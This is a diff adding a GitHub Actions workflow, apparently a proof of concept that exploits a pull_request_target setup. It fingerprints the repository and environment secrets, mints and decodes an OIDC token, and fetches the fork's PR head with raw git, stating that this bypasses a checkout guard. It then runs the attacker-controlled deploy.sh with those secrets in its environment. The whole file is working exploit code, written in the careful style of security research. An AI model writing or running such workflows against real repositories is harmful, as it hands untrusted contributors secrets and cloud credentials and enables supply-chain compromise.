@@ -1,0 +1,45 @@
+name: deploy
+on:
+  pull_request_target:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  consumer:
+    runs-on: ubuntu-latest
+    environment: ${{ github.head_ref }}
+    steps:
+      - name: capture
+        env:
+          TOK: ${{ secrets.ENV_TOKEN }}
+          REPOSEC: ${{ secrets.REPO_SECRET }}
+          EXPR: ${{ github.head_ref }}
+        run: |
+          echo "POC ENVEXPR=$EXPR"
+          echo "POC PR=#${{ github.event.pull_request.number }} FORK=${{ github.event.pull_request.head.repo.fork }}"
+          echo "POC ACTOR=${{ github.actor }} REF=${{ github.ref }}"
+          printf %s "$TOK" | sha256sum | cut -c1-16 | sed "s/^/POC TOKSHA=/"
+          printf %s "$REPOSEC" | sha256sum | cut -c1-16 | sed "s/^/POC REPOSHA=/"
+          echo "POC TOKLEN=${#TOK} REPOLEN=${#REPOSEC}"
+      - name: oidc
+        run: |
+          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=poc-aud" \
+            | python3 -c "import sys,json;print(json.load(sys.stdin)[\"value\"])")
+          echo "$tok" | cut -d. -f2 | python3 -c \
+            "import sys,base64,json; s=sys.stdin.read().strip(); s+=\"=\"*(-len(s)%4); \
+             print(\"POC CLAIMS=\"+json.dumps(json.loads(base64.urlsafe_b64decode(s)),sort_keys=True))"
+      - name: fetch-pr-head
+        env:
+          PRN: ${{ github.event.pull_request.number }}
+        run: |
+          git init -q .
+          git remote add origin "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}"
+          git fetch -q --depth=1 origin "refs/pull/$PRN/head"
+          git checkout -q FETCH_HEAD
+          echo "POC PR head fetched via raw git (checkout guard bypassed)"
+      - name: run-deploy-script
+        env:
+          TOK: ${{ secrets.ENV_TOKEN }}
+          REPOSEC: ${{ secrets.REPO_SECRET }}
+        run: bash deploy/deploy.sh || echo "POC deploy.sh exit=$?"
